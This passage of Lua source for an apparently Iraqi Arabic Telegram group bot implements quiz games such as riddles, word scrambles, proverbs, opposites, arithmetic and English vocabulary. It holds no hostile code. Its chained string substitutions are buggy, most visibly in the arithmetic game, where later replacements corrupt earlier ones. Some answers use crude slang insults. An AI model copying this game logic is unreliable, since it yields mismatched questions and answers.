name = string.gsub(name,'🚓','🚓') name = string.gsub(name,'🚑','🚑') name = string.gsub(name,'🚚','🚚') name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜') name = string.gsub(name,'🇮🇶','🇮🇶') name = string.gsub(name,'⚔️','⚔️') name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮') name = string.gsub(name,'🌡','🌡')  name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱') name = string.gsub(name,'🛢','🛢') name = string.gsub(name,'📓','📒') name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂') name = string.gsub(name,'📅','📆') name = string.gsub(name,'📪','📪') name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬') name = string.gsub(name,'📭','📭') name = string.gsub(name,'⏰','⏰') name = string.gsub(name,'📺','📺') name = string.gsub(name,'🎚','🎚') name = string.gsub(name,'☎️','☎️')
KASPER = '✟︙اول واحد يدز هذا السمايل  {'..name..'} يربح ،'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text == ''..(KASPERdx1:get(KASPER..'bot:klmos'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:ids'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:ids'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل سمايلات . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:ids'..msg.chat_id_,true)
end
--     By Developer KASPER     -- 
if text == 'ترتيب' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح') name = string.gsub(name,'سياره','ه ر س ي ا') name = string.gsub(name,'استقبال','ل ب ا ت ق س ا') name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا') name = string.gsub(name,'بزونه','ز و ه ن') name = string.gsub(name,'مطبخ','خ ب ط م') name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه') name = string.gsub(name,'مدرسه','ه م د ر س') name = string.gsub(name,'الوان','ن ا و ا ل') name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا') name = string.gsub(name,'كهوه','ه ك ه و') name = string.gsub(name,'سفينه','ه ن ف ي س') name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح') name = string.gsub(name,'طياره','ر ا ط ي ه') name = string.gsub(name,'رادار','ر ا ر ا د') name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م') name = string.gsub(name,'كهرباء','ر ب ك ه ا ء') name = string.gsub(name,'تفاحه','ح ه ا ت ف') name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س') name = string.gsub(name,'فرنسا','ن ف ر س ا') name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل') name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق') name = string.gsub(name,'بتيته','ب ت ت ي ه') name = string.gsub(name,'لهانه','ه ن ل ه ل') name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب') name = string.gsub(name,'سمكه','ك س م ه') name = string.gsub(name,'ذباب','ب ا ب ذ') name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب') name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت') name = string.gsub(name,'ساحه','ح ا ه س') name = string.gsub(name,'جسر','ر ج س')
KASPER = '✟︙اول واحد يرتبها  {'..name..'} يربح ،'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text == ''..(KASPERdx1:get(KASPER..'bot:klmo'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل ترتيب . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end
--     By Developer KASPER     -- 
if text == 'كت تويت' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
local KASPER = {  "آخر مرة زرت مدينة الملاهي؟",  "آخر مرة أكلت أكلتك المفضّلة؟",  "الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل",  "آخر شيء ضاع منك؟","كلمة أخيرة لشاغل البال؟","طريقتك المعتادة في التخلّص من الطاقة السلبية؟","شهر من أشهر العام له ذكرى جميلة معك؟","كلمة غريبة من لهجتك ومعناها؟🤓","‏- شيء سمعته عالق في ذهنك هاليومين؟","متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟","‏- أبرز صفة حسنة في صديقك المقرب؟","هل تشعر أن هنالك مَن يُحبك؟","اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟","أجمل شيء حصل معك خلال هاليوم؟","صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔","كلمة لشخص غالي اشتقت إليه؟💕","آخر خبر سعيد، متى وصلك؟","أنا آسف على ....؟","أوصف نفسك بكلمة؟","صريح، مشتاق؟","‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟","‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭","‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤","‏- تخيّل شيء قد يحدث في المستقبل؟","‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚","شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟","| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.", }  
KASPER2 = math.random(#KASPER)
KASPERdx(msg.chat_id_, msg.id_, 1, KASPER[KASPER2] , 1, 'md')  
end
--     By Developer KASPER     -- 
if text == 'محيبس' or text == 'بات' or text == 'المحيبس' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
Num = math.random(1,6)
KASPERdx1:set(KASPER.."GAMES"..msg.chat_id_,Num) 
TEST = [[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊


✟︙اختر رقم يد لاستخراج المحيبس ،
✟︙الفائز يحصل على { 5 } النقاط .*
]]
KASPERdx( msg.chat_id_, msg.id_, 1, TEST, 1, "md")
KASPERdx1:setex(KASPER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
if text == 'حزوره' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟') name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟') name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ') name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟') name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟') name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ') name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ') name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟') name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ') name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟') name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ') name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟') name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ') name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ') name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟') name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟') name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟') name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
KASPER = '✟︙اول واحد يحلها  {'..name..'} يربح '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text == ''..(KASPERdx1:get(KASPER..'bot:bkbk'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل حزوره . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'المعاني' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒') name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧') name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉') name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓') name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄') name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊') name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅') name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟') name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁') name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺') name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂') name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔') name = string.gsub(name,'تفاحه','🍎') name = string.gsub(name,'باذنجان','🍆')
KASPER = '✟︙ما معنى هذا السمايل ؟  {'..name..'} '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text == ''..(KASPERdx1:get(KASPER..'bot:bkbk2'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل المعاني . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'العكس' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
KASPER = '✟︙عكس كلمه ~ {'..name..'} '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text == ''..(KASPERdx1:get(KASPER..'bot:bkbk3'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل العكس . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'المختلف' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
};
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹') name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼👻👻👻👻👻') name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚') name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟') name = string.gsub(name,'📥','💫💫💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨') name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃') name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻') name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳') name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♂🧜‍♀🧜‍♀🧜‍♀') name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀') 
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️') name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭') name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒') name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳') name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
KASPER = '✟︙اول واحد يطلع المختلف {'..name..'} يربح ،'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text == ''..(KASPERdx1:get(KASPER..'bot:bkbk4'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل المختلف . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:bkbk5'..msg.chat_id_,name)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
KASPER = '✟︙اكمل المثل التالي \n {'..name..'}'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end 
if text == ''..(KASPERdx1:get(KASPER..'bot:bkbk5'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل امثله . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'رياضيات' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:bkbk6'..msg.chat_id_,name)
name = string.gsub(name,'9','7 + 2 = ?') name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?') name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?') name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?') name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?') name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?') name = string.gsub(name,'5','12 + 1 - 8 = ?') name = string.gsub(name,'16','16 + 16 - 16 = ?')
KASPER = '✟︙اكمل المعادله ،\n - {'..name..'} .'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end 
if text == ''..(KASPERdx1:get(KASPER..'bot:bkbk6'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل رياضيات . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end
if text == 'انكليزي' and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:id'..msg.chat_id_)
KASPER2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:bkbk7'..msg.chat_id_,name)
name = string.gsub(name,'ذئب','Wolf') name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels') name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book') name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money') name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile') name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid') name = string.gsub(name,'صداقه','Friendchip')
name = string.gsub(name,'ذكي','Smart') 
KASPER = '✟︙ما معنى كلمه {'..name..'} ، '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text == ''..(KASPERdx1:get(KASPER..'bot:bkbk7'..msg.chat_id_) or 'لفاتع')..'' and not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then
if not KASPERdx1:get(KASPER..'bot:l:id'..msg.chat_id_) then 
KASPER = '✟︙مبروك لقد ربحت ،\n✟︙للعب مره اخرى ارسل انكليزي . '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
KASPERdx1:set(KASPER..'bot:l:id'..msg.chat_id_,true)
end
--     By Developer KASPER     -- 
